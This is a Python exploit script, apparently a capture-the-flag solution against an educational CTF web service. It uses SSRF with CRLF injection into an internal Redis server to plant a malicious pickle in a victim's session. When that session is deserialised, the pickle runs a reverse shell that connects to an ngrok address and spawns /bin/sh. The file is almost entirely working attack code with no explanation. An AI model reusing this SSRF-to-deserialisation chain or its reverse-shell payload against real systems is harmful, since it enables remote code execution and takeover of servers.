#!/usr/bin/python3
import requests
import urllib3

urllib3.disable_warnings()

TEST = False

if TEST:
    weburl = 'http://172.18.0.1:5566/'
else:
    # weburl = 'https://172.17.0.1:10163/'
    weburl = 'https://edu-ctf.csie.org:10163/'

session1 = requests.Session()
session2 = requests.Session()

resposne = session1.get(weburl, verify=False)
cookies1 = session1.cookies.get_dict()
print('Session1 ID: {}'.format(cookies1['session']))

def ssrf(redisCmd):
    data = {'url': 'http://redis:6379?\x0d\x0a'+redisCmd+'\x0d\x0apadding'}
    response = session2.post(weburl, data=data, verify=False)
    if TEST == False:
        tinyurl = response.text
        response = session2.get(tinyurl, verify=False)
        print(response.text)

victimSession = cookies1['session']
if TEST:
    myServer = "172.18.0.1"
    myPort   = "5566"
else:
    myServer = "0.tcp.ngrok.io"
    myPort   = "15416"
fakeContent = "cposix\\nsystem\\np1\\n(S'python -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"" + myServer + "\\\"," + myPort + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);\\''\\np2\\ntRp3\\n." 
ssrf('set "session:' + victimSession + '" "' + fakeContent + '"')

resposne = session1.get(weburl, verify=False)
